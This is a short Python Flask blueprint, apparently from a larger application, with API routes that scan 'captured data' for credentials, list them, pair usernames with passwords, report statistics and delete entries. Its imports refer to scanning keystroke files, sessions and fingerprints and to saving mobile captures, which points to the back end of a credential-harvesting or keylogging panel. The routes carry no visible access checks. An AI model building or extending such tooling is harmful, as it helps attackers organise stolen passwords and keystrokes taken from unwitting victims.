"""credentials blueprint (P3 batch extract)."""
from __future__ import annotations

import os, json, base64
import uuid as uuid_module
from datetime import datetime, timedelta
from functools import wraps
from flask import (Blueprint, request, jsonify, redirect, url_for, render_template, send_from_directory, make_response, session, Response)
from app.state import *  # noqa: F401,F403  -- P3
from app.state import BASE_DIR, CONFIG, _decode_data_url, _save_mobile_capture
import database as db

from credential_parser import get_credential_stats, pair_credentials, scan_fingerprints, scan_keystroke_files, scan_sessions
from app.services import intel as intelsvc
bp = Blueprint("credentials", __name__,
               template_folder=os.path.join(BASE_DIR, "flask_templates"))


@bp.route('/api/credentials/scan', methods=['POST'])
def credentials_scan():
    """Trigger a credential scan across all captured data"""
    try:
        return jsonify(intelsvc.run_credential_scan())
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@bp.route('/api/credentials/list')
def credentials_list():
    """List all discovered credentials"""
    cred_type = request.args.get('type')
    return jsonify({'credentials': intelsvc.list_credentials(cred_type=cred_type)})

@bp.route('/api/credentials/pairs')
def credentials_pairs():
    """Get paired username:password combinations"""
    return jsonify({'pairs': intelsvc.credential_pairs()})

@bp.route('/api/credentials/stats')
def credentials_stats():
    """Get credential statistics"""
    stats = intelsvc.credential_stats()
    return jsonify({'stats': stats, 'total': sum(stats.values())})

@bp.route('/api/credentials/delete/<int:cred_id>', methods=['DELETE'])
def credentials_delete(cred_id):
    intelsvc.delete_credential(cred_id)
    return jsonify({'status': 'deleted'})
